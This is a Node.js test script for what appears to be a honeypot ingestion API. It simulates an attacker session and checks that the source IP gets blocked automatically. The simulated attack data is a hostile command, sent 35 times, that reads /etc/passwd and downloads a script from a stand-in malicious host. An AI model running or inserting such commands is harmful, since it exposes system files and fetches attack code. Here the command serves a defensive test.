const axios = require('axios')

const API_URL = process.env.API_URL || 'http://localhost:5000/api'
const API_KEY = process.env.HONEYPOT_API_KEY || process.env.SENTINEL_KEY
if (!API_KEY) {
  console.error('CRITICAL: HONEYPOT_API_KEY or SENTINEL_KEY environment variable is required.')
  process.exit(1)
}
const IP_TO_BLOCK = process.env.IP_TO_BLOCK || '185.220.101.99'
const SESSION_ID = 'test-sess-' + Date.now()

async function run() {
  try {
    const headers = {
      'Content-Type': 'application/json',
      'X-API-Key': API_KEY,
    }

    console.log('1. Opening honeypot session for:', IP_TO_BLOCK)
    const openRes = await axios.post(
      `${API_URL}/honeypot/ingest`,
      {
        eventType: 'SESSION_OPENED',
        sessionId: SESSION_ID,
        sourceIP: IP_TO_BLOCK,
        sourcePort: 49152,
        honeypotNode: 'SSH-COWRIE-01',
      },
      { headers }
    )
    console.log('Open response:', openRes.data)

    console.log('2. Sending 35 malicious commands sequentially...')
    for (let i = 0; i < 35; i++) {
      await axios.post(
        `${API_URL}/honeypot/ingest/command`,
        {
          sessionId: SESSION_ID,
          sourceIP: IP_TO_BLOCK,
          command: `cat /etc/passwd && wget http://malicious-site.com/exploit_${i}.sh`,
          intent: 'REVERSE_SHELL',
          isMalware: true,
        },
        { headers }
      )
    }
    console.log('Commands sent successfully.')

    console.log('3. Closing honeypot session to trigger auto-block...')
    const closeRes = await axios.post(
      `${API_URL}/honeypot/ingest/close`,
      {
        sessionId: SESSION_ID,
        sourceIP: IP_TO_BLOCK,
        durationSeconds: 300,
      },
      { headers }
    )
    console.log('Close response:', closeRes.data)

    console.log('3. Checking if IP is blocked in database...')
    // We can check /honeypot/ingest/check-block?ip=127.0.0.1
    const checkRes = await axios.get(`${API_URL}/honeypot/ingest/check-block?ip=${IP_TO_BLOCK}`, { headers })
    console.log('Check block response:', checkRes.data)
  } catch (err) {
    console.error('Error running script:', err.response ? err.response.data : err.message)
  }
}

run()
